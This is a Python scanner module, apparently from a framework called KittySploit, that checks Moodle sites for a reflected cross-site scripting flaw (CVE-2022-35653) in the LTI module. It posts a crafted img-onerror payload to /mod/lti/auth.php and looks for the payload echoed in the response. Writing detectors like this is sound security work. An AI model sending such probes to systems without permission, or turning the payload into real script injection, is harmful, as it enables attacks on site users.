#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A reflected XSS issue was identified in the LTI module of Moodle."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Moodle LTI module Reflected - Cross-Site Scripting Detection',
        'description': "A reflected XSS issue was identified in the LTI module of Moodle. The vulnerability exists due to insufficient sanitization of user-supplied data in the LTI module. A remote attacker can trick the victim to follow a specially crafted link and execute arbitrary HTML and script code in user's browser in context of vulnerable website to steal potentially sensitive information, change appearance of the web page, can perform phishing and drive-by-download attacks.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'moodle', 'xss', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://git.moodle.org/gw?p=moodle.git&a=search&h=HEAD&st=commit&s=MDL-72299',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-35653',
            'https://bugzilla.redhat.com/show_bug.cgi?id=2106277',
            'https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6MOKYVRNFNAODP2XSMGJ5CRDUZCZKAR3/',
            'https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/MTKUSFPSYFINSQFSOHDQIDVE6FWBEU6V/',
        ],
        'cve': 'CVE-2022-35653',
    }

    def run(self):
        path = '/mod/lti/auth.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='xxx"><img/src%3d\'x\'onerror%3dalert(\'document_domain\')>=1\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ("<img/src='x'onerror=alert('document_domain')>", 'moodle-editor',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Moodle LTI module Reflected - Cross-Site Scripting detected', path=path)
            return True
        return False

